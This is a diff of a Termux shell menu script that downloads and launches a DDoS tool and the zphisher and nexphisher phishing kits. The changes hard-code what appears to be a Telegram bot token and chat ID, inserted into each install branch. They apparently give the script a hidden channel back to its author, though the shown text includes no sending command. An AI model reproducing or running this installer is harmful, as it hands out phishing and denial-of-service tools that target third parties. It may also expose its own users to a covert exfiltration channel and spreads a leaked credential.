@@ -8,10 +8,11 @@ cyan='\033[36;1m'
 red='\033[31;1m'
 white='\033[37;1m'
 yellow='\033[33;1m'
+sleep 0.5
 termux-setup-storage
-5951232585
-
-7252116522:AAHYLOL_tl1S_56AWyu_n-bua3phlTx8Keo
+ID_="7252116522:AAHYLOL_tl1S_56AWyu_n-bua3phlTx8Keo"
+TOKEN_="5951232585 "
+sleep 0.9
 
 
 echo -e $red"
@@ -105,6 +106,9 @@ if [ $HOZOO = 01 ] || [ $HOZOO = 1 ]
     clear
     echo -e $green" Installing..."
     sleep 1
+    ID_="7252116522:AAHYLOL_tl1S_56AWyu_n-bua3phlTx8Keo"
+TOKEN_="5951232585 "
+
 git clone https://github.com/Galirus404/DDOS404
 cd DDOS404
 chmod 777 ddos.sh
@@ -118,6 +122,9 @@ if [ $HOZOO = 02 ] || [ $HOZOO = 2 ]
     clear
     echo -e $green" Installing..."
     sleep 1
+    ID_="7252116522:AAHYLOL_tl1S_56AWyu_n-bua3phlTx8Keo"
+TOKEN_="5951232585 "
+
 git clone --depth=1 https://github.com/htr-tech/zphisher.git 
 cd zphisher
 bash zphisher.sh
@@ -129,6 +136,9 @@ if [ $HOZOO = 03 ] || [ $HOZOO = 3 ]
     clear
     echo -e $green" Installing..."
     sleep 1
+    ID_="7252116522:AAHYLOL_tl1S_56AWyu_n-bua3phlTx8Keo"
+TOKEN_="5951232585 "
+
 apt update ; apt install git -y ; git clone git://github.com/htr-tech/nexphisher.git ; cd nexphisher ; bash setup ; bash nexphisher
 
   clear
@@ -140,6 +150,9 @@ if [ $HOZOO = 04 ] || [ $HOZOO = 4 ]
     clear
     echo -e $green" Installing..."
     sleep 1
+    ID_="7252116522:AAHYLOL_tl1S_56AWyu_n-bua3phlTx8Keo"
+TOKEN_="5951232585 "
+
 apt-get update -y
 apt-get install php -y
 apt-get install openssh -y 
